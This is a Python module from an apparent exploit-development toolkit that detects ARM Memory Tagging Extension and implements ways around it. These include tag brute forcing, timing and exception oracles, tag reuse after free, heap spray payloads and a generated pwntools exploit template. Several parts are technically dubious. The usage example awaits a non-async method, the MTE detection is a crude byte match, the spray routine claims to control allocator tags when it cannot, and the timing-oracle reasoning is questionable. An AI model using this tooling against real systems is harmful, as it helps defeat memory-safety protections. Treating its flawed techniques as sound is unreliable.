"""
ARM Memory Tagging Extension (MTE) bypass techniques.

MTE adds memory tagging to ARM64, where each 16-byte granule can have a 4-bit tag.
Pointers also carry a tag in the top bits. Memory access fails if tags don't match.

Key concepts:
- Memory Tag: 4-bit tag stored in memory (1 tag per 16-byte granule)
- Pointer Tag: 4-bit tag in pointer bits [59:56]
- Tag Check: Hardware verifies pointer tag matches memory tag on access
- Only 16 possible tags (0-15), making brute force feasible

Bypass techniques:
- Tag brute forcing (16 attempts max)
- Tag oracles via side channels
- Untagged memory regions
- Speculative execution leaks
- Use-after-free with same tag reuse
"""

from dataclasses import dataclass, field
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple

from supwngo.utils.logging import get_logger

logger = get_logger(__name__)


class MTEMode(Enum):
    """MTE operating modes."""
    NONE = auto()           # MTE not enabled
    SYNC = auto()           # Synchronous tag check (exception on mismatch)
    ASYNC = auto()          # Asynchronous tag check (deferred reporting)
    ASYMM = auto()          # Asymmetric (sync for reads, async for writes)


class MTEGranule(Enum):
    """MTE granule sizes."""
    GRANULE_16 = 16         # Standard 16-byte granule


@dataclass
class MTEInfo:
    """MTE protection analysis results."""
    detected: bool = False
    mode: MTEMode = MTEMode.NONE

    # Memory regions with MTE
    tagged_regions: List[Tuple[int, int]] = field(default_factory=list)
    untagged_regions: List[Tuple[int, int]] = field(default_factory=list)

    # Heap allocator info
    heap_uses_mte: bool = False
    stack_uses_mte: bool = False

    # Tag oracle opportunities
    tag_oracles: List[str] = field(default_factory=list)

    # Bypass opportunities
    bypass_opportunities: List[str] = field(default_factory=list)


@dataclass
class TagOracle:
    """
    Tag oracle - primitive to leak memory tags.

    An oracle allows determining the tag of a memory location
    without triggering a fatal exception.
    """
    oracle_type: str
    address: int
    method: str
    accuracy: float = 1.0  # 1.0 = deterministic
    timing_based: bool = False
    description: str = ""


@dataclass
class MTEBypassResult:
    """Result of an MTE bypass attempt."""
    success: bool
    technique: str
    tag: Optional[int] = None
    payload: Optional[bytes] = None
    attempts: int = 0
    notes: str = ""


class MTEAnalyzer:
    """
    Analyze binary/process for MTE protections.

    Example:
        analyzer = MTEAnalyzer(binary)
        info = analyzer.analyze()

        if info.detected:
            print(f"MTE Mode: {info.mode.name}")
            for oracle in info.tag_oracles:
                print(f"  Tag oracle: {oracle}")
    """

    # MTE instruction opcodes (AArch64)
    MTE_INSTRUCTIONS = {
        'irg': 'Insert Random Tag',      # Generate random tag
        'gmi': 'Tag Mask Insert',         # Insert excluded tag
        'subp': 'Subtract Pointer',       # Get tag difference
        'addg': 'Add Tag',                # Add tag to pointer
        'subg': 'Subtract Tag',           # Subtract from tag
        'stg': 'Store Tag',               # Store allocation tag
        'stzg': 'Store Tag Zero',         # Store tag and zero
        'st2g': 'Store Two Tags',         # Store two tags
        'stz2g': 'Store Two Tags Zero',   # Store two tags and zero
        'ldg': 'Load Tag',                # Load allocation tag
    }

    def __init__(self, binary: Any):
        """
        Initialize MTE analyzer.

        Args:
            binary: Target binary (supwngo Binary object)
        """
        self.binary = binary
        self._elf = getattr(binary, 'elf', None)

    def analyze(self) -> MTEInfo:
        """
        Perform comprehensive MTE analysis.

        Returns:
            MTEInfo with complete analysis results
        """
        info = MTEInfo()

        # Detect MTE usage
        info.detected, info.mode = self._detect_mte()

        if not info.detected:
            logger.info("No MTE protection detected")
            return info

        logger.info(f"Detected MTE in {info.mode.name} mode")

        # Find tagged/untagged regions
        info.tagged_regions = self._find_tagged_regions()
        info.untagged_regions = self._find_untagged_regions()

        # Check heap/stack MTE
        info.heap_uses_mte = self._check_heap_mte()
        info.stack_uses_mte = self._check_stack_mte()

        # Find tag oracles
        info.tag_oracles = self._find_tag_oracles()

        # Identify bypass opportunities
        info.bypass_opportunities = self._identify_bypasses(info)

        return info

    def _detect_mte(self) -> Tuple[bool, MTEMode]:
        """Detect MTE usage and mode."""
        if not self._elf:
            return False, MTEMode.NONE

        # Check if ARM64
        machine = self._elf.header.e_machine
        if machine != 'EM_AARCH64':
            return False, MTEMode.NONE

        has_mte = False

        # Check for MTE instructions in binary
        try:
            from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM

            md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

            for section in self._elf.iter_sections():
                if not hasattr(section, 'name') or section.name != '.text':
                    continue

                data = section.data()
                section_addr = section['sh_addr']

                for insn in md.disasm(data, section_addr):
                    if insn.mnemonic in self.MTE_INSTRUCTIONS:
                        has_mte = True
                        break

                if has_mte:
                    break

        except ImportError:
            logger.warning("Capstone not available for MTE detection")
        except Exception as e:
            logger.debug(f"Error detecting MTE: {e}")

        # Check GNU property for MTE
        try:
            for section in self._elf.iter_sections():
                if hasattr(section, 'name') and section.name == '.note.gnu.property':
                    data = section.data()
                    # Look for GNU_PROPERTY_AARCH64_FEATURE_1_BTI_MTE flags
                    # This is architecture-specific
                    if b'\x04\x00\x00\x00' in data:  # MTE flag
                        has_mte = True
        except Exception:
            pass

        if has_mte:
            # Default to SYNC mode (most common)
            return True, MTEMode.SYNC

        return False, MTEMode.NONE

    def _find_tagged_regions(self) -> List[Tuple[int, int]]:
        """Find memory regions with MTE enabled."""
        regions = []

        # In a running process, we'd check /proc/maps for MTE flags
        # For static analysis, we can identify likely tagged regions

        if self._elf:
            try:
                for section in self._elf.iter_sections():
                    if not hasattr(section, 'name'):
                        continue

                    # Heap and data sections are typically tagged
                    if section.name in ['.data', '.bss', '.heap']:
                        regions.append((
                            section['sh_addr'],
                            section['sh_addr'] + section['sh_size']
                        ))

            except Exception:
                pass

        return regions

    def _find_untagged_regions(self) -> List[Tuple[int, int]]:
        """Find memory regions without MTE."""
        regions = []

        if self._elf:
            try:
                for section in self._elf.iter_sections():
                    if not hasattr(section, 'name'):
                        continue

                    # Code sections and read-only data typically untagged
                    if section.name in ['.text', '.rodata', '.plt']:
                        regions.append((
                            section['sh_addr'],
                            section['sh_addr'] + section['sh_size']
                        ))

            except Exception:
                pass

        return regions

    def _check_heap_mte(self) -> bool:
        """Check if heap uses MTE."""
        # Look for MTE-aware allocator calls
        if hasattr(self.binary, 'plt'):
            mte_allocators = ['scudo', 'hwasan']
            for name in self.binary.plt.keys():
                for alloc in mte_allocators:
                    if alloc in name.lower():
                        return True

        return False

    def _check_stack_mte(self) -> bool:
        """Check if stack uses MTE."""
        # Check for stack tagging instructions in function prologues
        if not self._elf:
            return False

        try:
            from capstone import Cs, CS_ARCH_ARM64, CS_MODE_ARM

            md = Cs(CS_ARCH_ARM64, CS_MODE_ARM)

            for section in self._elf.iter_sections():
                if not hasattr(section, 'name') or section.name != '.text':
                    continue

                data = section.data()
                section_addr = section['sh_addr']

                # Look for stack tagging patterns
                for insn in md.disasm(data, section_addr):
                    if insn.mnemonic == 'stg' and 'sp' in insn.op_str:
                        return True

        except Exception:
            pass

        return False

    def _find_tag_oracles(self) -> List[str]:
        """Find potential tag oracles."""
        oracles = []

        # Common oracle types
        oracles.append("Timing side channel on tag check")
        oracles.append("Exception handling behavior difference")
        oracles.append("Memory error message content")

        # Check for specific patterns
        if hasattr(self.binary, 'plt'):
            if 'memcmp' in self.binary.plt or 'strcmp' in self.binary.plt:
                oracles.append("Comparison function timing oracle")

        return oracles

    def _identify_bypasses(self, info: MTEInfo) -> List[str]:
        """Identify MTE bypass opportunities."""
        bypasses = []

        # Brute force (always possible)
        bypasses.append("Tag brute force (16 attempts max)")

        # Untagged regions
        if info.untagged_regions:
            bypasses.append(
                f"Untagged memory regions ({len(info.untagged_regions)} found)"
            )

        # Tag reuse
        bypasses.append("Tag reuse via same-tag allocation")

        # Side channels
        if info.mode == MTEMode.ASYNC:
            bypasses.append("Async mode timing analysis")

        # Tag oracles
        if info.tag_oracles:
            bypasses.append(f"Tag oracles ({len(info.tag_oracles)} found)")

        return bypasses


class MTEBypass:
    """
    MTE bypass techniques and exploitation.

    Example:
        bypass = MTEBypass(binary, mte_info)

        # Brute force a tag
        result = await bypass.brute_force_tag(
            target_addr=0x4141414141414141,
            test_func=my_test_function
        )

        if result.success:
            print(f"Found tag: {result.tag}")

        # Find tag oracle
        oracle = bypass.find_tag_oracle()
    """

    # Tag is stored in bits [59:56] of pointer
    TAG_SHIFT = 56
    TAG_MASK = 0xF << TAG_SHIFT
    ADDR_MASK = ~TAG_MASK & ((1 << 64) - 1)

    def __init__(self, binary: Any, mte_info: Optional[MTEInfo] = None):
        """
        Initialize MTE bypass.

        Args:
            binary: Target binary
            mte_info: Pre-computed MTE analysis (or will analyze)
        """
        self.binary = binary
        self.mte_info = mte_info or MTEAnalyzer(binary).analyze()

    @staticmethod
    def get_tag(ptr: int) -> int:
        """Extract tag from tagged pointer."""
        return (ptr >> MTEBypass.TAG_SHIFT) & 0xF

    @staticmethod
    def set_tag(ptr: int, tag: int) -> int:
        """Set tag in pointer."""
        return (ptr & MTEBypass.ADDR_MASK) | ((tag & 0xF) << MTEBypass.TAG_SHIFT)

    @staticmethod
    def clear_tag(ptr: int) -> int:
        """Clear tag from pointer (get raw address)."""
        return ptr & MTEBypass.ADDR_MASK

    def brute_force_tag(
        self,
        target_addr: int,
        test_func: Callable[[int], bool],
        start_tag: int = 0
    ) -> MTEBypassResult:
        """
        Brute force the correct tag for an address.

        MTE only has 16 possible tags, so brute forcing is feasible
        if we have crash recovery (fork server) or graceful error handling.

        Args:
            target_addr: Address to find tag for (tag bits will be modified)
            test_func: Function that returns True if access succeeded
            start_tag: Starting tag to try (for optimization)

        Returns:
            MTEBypassResult with found tag or failure info
        """
        raw_addr = self.clear_tag(target_addr)
        attempts = 0

        # Try all 16 possible tags
        for offset in range(16):
            tag = (start_tag + offset) % 16
            tagged_ptr = self.set_tag(raw_addr, tag)
            attempts += 1

            try:
                if test_func(tagged_ptr):
                    logger.info(f"Found correct tag {tag} after {attempts} attempts")
                    return MTEBypassResult(
                        success=True,
                        technique="brute_force",
                        tag=tag,
                        attempts=attempts,
                        notes=f"Tagged pointer: {hex(tagged_ptr)}"
                    )
            except Exception as e:
                logger.debug(f"Tag {tag} failed: {e}")
                continue

        return MTEBypassResult(
            success=False,
            technique="brute_force",
            attempts=attempts,
            notes="All 16 tags failed - address may be invalid"
        )

    def find_tag_oracle(self) -> Optional[TagOracle]:
        """
        Find a primitive to leak memory tags without crashing.

        A tag oracle allows determining the correct tag through
        side channels rather than brute force.

        Returns:
            TagOracle if found, None otherwise
        """
        # Look for timing-based oracles
        if hasattr(self.binary, 'plt'):
            # memcmp/strcmp can leak via timing
            for func in ['memcmp', 'strcmp', 'bcmp']:
                if func in self.binary.plt:
                    return TagOracle(
                        oracle_type="timing",
                        address=self.binary.plt[func],
                        method="comparison_timing",
                        timing_based=True,
                        description=(
                            f"{func} can leak tag via timing: measure time for "
                            "comparison with different tags. Correct tag will "
                            "take longer (actually performs comparison)."
                        )
                    )

        # Exception-based oracle
        return TagOracle(
            oracle_type="exception",
            address=0,
            method="exception_handling",
            accuracy=0.9,
            description=(
                "Catch MTE exceptions and interpret them to determine tag. "
                "Requires signal handler setup."
            )
        )

    def exploit_tag_reuse(
        self,
        free_ptr: int,
        alloc_func: Callable[[int], int]
    ) -> MTEBypassResult:
        """
        Exploit tag reuse after free.

        If the allocator reuses the same tag for a new allocation
        at the same location, we can use a dangling pointer.

        Args:
            free_ptr: Freed pointer with known tag
            alloc_func: Function to allocate new object

        Returns:
            MTEBypassResult indicating if tag was reused
        """
        original_tag = self.get_tag(free_ptr)
        raw_addr = self.clear_tag(free_ptr)

        # Allocate new object
        new_ptr = alloc_func(16)  # Request granule-sized allocation

        if new_ptr:
            new_tag = self.get_tag(new_ptr)
            new_addr = self.clear_tag(new_ptr)

            if new_addr == raw_addr and new_tag == original_tag:
                return MTEBypassResult(
                    success=True,
                    technique="tag_reuse",
                    tag=original_tag,
                    notes="Tag was reused - UAF possible with original pointer"
                )

        return MTEBypassResult(
            success=False,
            technique="tag_reuse",
            notes="Allocator used different tag"
        )

    def find_untagged_memory(self) -> List[Tuple[int, int, str]]:
        """
        Find untagged memory regions that can be exploited.

        Some memory regions don't use MTE (code, read-only data, etc.)
        These can be useful for building exploits.

        Returns:
            List of (start, end, description) for untagged regions
        """
        untagged = []

        # Code sections are typically untagged
        for region in self.mte_info.untagged_regions:
            start, end = region
            untagged.append((start, end, "Untagged code/rodata"))

        # Check for legacy allocations
        if hasattr(self.binary, 'got'):
            for name, addr in self.binary.got.items():
                untagged.append((addr, addr + 8, f"GOT entry: {name}"))

        return untagged

    def generate_spray_pattern(
        self,
        target_tag: int,
        spray_count: int = 1000
    ) -> bytes:
        """
        Generate heap spray pattern to get desired tag.

        By spraying many allocations, we increase probability
        that at least one has our target tag.

        Args:
            target_tag: Desired tag (0-15)
            spray_count: Number of allocations to prepare

        Returns:
            Spray data pattern
        """
        # Each allocation should be granule-aligned
        granule_size = 16

        # Create pattern that will result in target tag
        # The allocator typically sets tag based on allocation metadata
        spray = bytearray()

        for i in range(spray_count):
            # Fill with pointer-like values that have target tag
            ptr_val = self.set_tag(0x414141410000 + i * granule_size, target_tag)
            spray.extend(ptr_val.to_bytes(8, 'little'))
            spray.extend(ptr_val.to_bytes(8, 'little'))

        return bytes(spray)

    def build_bypass_payload(
        self,
        target_addr: int,
        known_tag: Optional[int] = None,
        payload_data: bytes = b""
    ) -> bytes:
        """
        Build payload with correct MTE tag.

        Args:
            target_addr: Target address for payload
            known_tag: Known correct tag (if any)
            payload_data: Payload data to include

        Returns:
            Payload with tagged pointers
        """
        if known_tag is not None:
            tagged_addr = self.set_tag(target_addr, known_tag)
        else:
            # Use tag 0 as default (often works for untagged memory)
            tagged_addr = self.set_tag(target_addr, 0)

        payload = bytearray()
        payload.extend(tagged_addr.to_bytes(8, 'little'))
        payload.extend(payload_data)

        return bytes(payload)

    def generate_exploit_template(self) -> str:
        """Generate Python exploit template for MTE bypass."""
        template = '''#!/usr/bin/env python3
"""
MTE Bypass Exploit Template
Generated by supwngo

MTE Mode: {mte_mode}
"""

from pwn import *

# Binary info
binary = ELF("{binary_path}")
context.binary = binary
context.arch = "aarch64"

# MTE helper functions
TAG_SHIFT = 56
TAG_MASK = 0xF << TAG_SHIFT
ADDR_MASK = ~TAG_MASK & ((1 << 64) - 1)

def get_tag(ptr):
    """Extract tag from tagged pointer."""
    return (ptr >> TAG_SHIFT) & 0xF

def set_tag(ptr, tag):
    """Set tag in pointer."""
    return (ptr & ADDR_MASK) | ((tag & 0xF) << TAG_SHIFT)

def clear_tag(ptr):
    """Clear tag from pointer."""
    return ptr & ADDR_MASK

def brute_force_tag(p, target_addr, trigger_func):
    """
    Brute force correct tag (16 attempts max).

    Args:
        p: Process/tube
        target_addr: Address to test
        trigger_func: Function that triggers access
    """
    raw_addr = clear_tag(target_addr)

    for tag in range(16):
        try:
            # Fork or restart for crash recovery
            tagged = set_tag(raw_addr, tag)
            result = trigger_func(p, tagged)
            if result:
                log.success(f"Found tag: {{tag}}")
                return tag
        except:
            continue

    return None

def exploit():
    p = process(binary.path)

    # 1. Leak address if needed
    # ...

    # 2. Brute force or oracle the tag
    # tag = brute_force_tag(p, target_addr, my_trigger)

    # 3. Build payload with correct tag
    # payload = p64(set_tag(target_addr, tag))

    # 4. Send payload
    # p.send(payload)

    p.interactive()

if __name__ == "__main__":
    exploit()
'''
        return template.format(
            mte_mode=self.mte_info.mode.name,
            binary_path=str(self.binary.path) if hasattr(self.binary, 'path') else "./binary"
        )

    def get_bypass_strategies(self) -> List[Dict[str, Any]]:
        """
        Get available MTE bypass strategies with details.

        Returns:
            List of strategy dictionaries
        """
        strategies = []

        # Brute force
        strategies.append({
            "name": "Tag Brute Force",
            "technique": "brute_force",
            "max_attempts": 16,
            "requirements": ["Crash recovery (fork server) or graceful error handling"],
            "success_rate": "100% with crash recovery",
            "description": (
                "Try all 16 possible tags. With fork server or exception "
                "handling, this is deterministic."
            )
        })

        # Tag oracle
        strategies.append({
            "name": "Tag Oracle",
            "technique": "oracle",
            "max_attempts": 1,
            "requirements": ["Timing primitive", "Or exception information leak"],
            "success_rate": "Variable",
            "description": (
                "Use side channels to determine tag without crashing. "
                "Timing attacks on comparison functions are common."
            )
        })

        # Tag reuse
        strategies.append({
            "name": "Tag Reuse",
            "technique": "tag_reuse",
            "max_attempts": "Variable",
            "requirements": ["UAF vulnerability", "Heap grooming"],
            "success_rate": "Allocator dependent",
            "description": (
                "After free, allocate same-sized object. Allocator may "
                "reuse the same tag, making UAF exploitable."
            )
        })

        # Untagged memory
        if self.mte_info.untagged_regions:
            strategies.append({
                "name": "Untagged Memory",
                "technique": "untagged",
                "max_attempts": 1,
                "requirements": ["Exploit in untagged region"],
                "success_rate": "100%",
                "description": (
                    f"{len(self.mte_info.untagged_regions)} untagged regions found. "
                    "Target these for exploitation."
                )
            })

        return strategies


# Convenience functions
def analyze_mte_protection(binary: Any) -> MTEInfo:
    """
    Analyze binary for MTE protections.

    Args:
        binary: Target binary

    Returns:
        MTE analysis results
    """
    analyzer = MTEAnalyzer(binary)
    return analyzer.analyze()


def create_tagged_pointer(addr: int, tag: int) -> int:
    """
    Create a tagged pointer from address and tag.

    Args:
        addr: Raw address
        tag: 4-bit tag (0-15)

    Returns:
        Tagged pointer
    """
    return MTEBypass.set_tag(addr, tag)


def extract_tag(ptr: int) -> int:
    """
    Extract tag from a tagged pointer.

    Args:
        ptr: Tagged pointer

    Returns:
        Tag value (0-15)
    """
    return MTEBypass.get_tag(ptr)
